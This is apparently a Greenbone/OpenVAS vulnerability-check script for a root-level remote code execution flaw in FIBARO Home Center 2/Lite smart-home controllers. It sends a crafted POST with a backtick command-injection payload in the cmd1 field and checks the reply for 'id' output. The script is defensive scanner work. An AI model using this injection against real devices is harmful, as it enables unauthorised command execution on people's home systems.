CPE = "cpe:/a:fibaro:home_center";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140420" );
	script_version( "2020-04-12T08:18:11+0000" );
	script_tag( name: "last_modification", value: "2020-04-12 08:18:11 +0000 (Sun, 12 Apr 2020)" );
	script_tag( name: "creation_date", value: "2017-09-29 15:41:18 +0700 (Fri, 29 Sep 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "FIBARO Home Center 2/Lite RCE Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_fibaro_home_center_detect.sc" );
	script_mandatory_keys( "fibaro_home_center/detected" );
	script_tag( name: "summary", value: "FIBARO Home Center 2/Lite are prone to a remote code execution
  vulnerability." );
	script_tag( name: "insight", value: "FIBARO Home Center 2 and Home Center Lite don't validate input correctly
  in services/liliSetDeviceCommand.php which allows an attacker to execute arbitrary commands and escalate their
  privileges to root." );
	script_tag( name: "affected", value: "FIBARO Home Center 2/Lite prior to version 4.140." );
	script_tag( name: "solution", value: "Update to version 4.140 or later." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_xref( name: "URL", value: "https://forsec.nl/2017/09/smart-home-remote-command-execution-rce/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
url = "/services/liliSetDeviceCommand.php";
data = "deviceID=1&deviceName=&deviceType=&cmd1=`id${IFS}`&cmd2=&roomID=1&roomName=&sectionID=&sectionName=&lang=en";
req = http_post_put_req( port: port, url: url, data: data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8", "X-Fibaro-Version", "2", "X-Requested-With", "XMLHttpRequest" ) );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "uid=[0-9]+.*gid=[0-9]+" )){
	result = eregmatch( pattern: "uid=[0-9]+[^']+", string: res );
	report = "It was possible to execute the 'id' command.\\n\\nResult:\\n" + result[0];
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

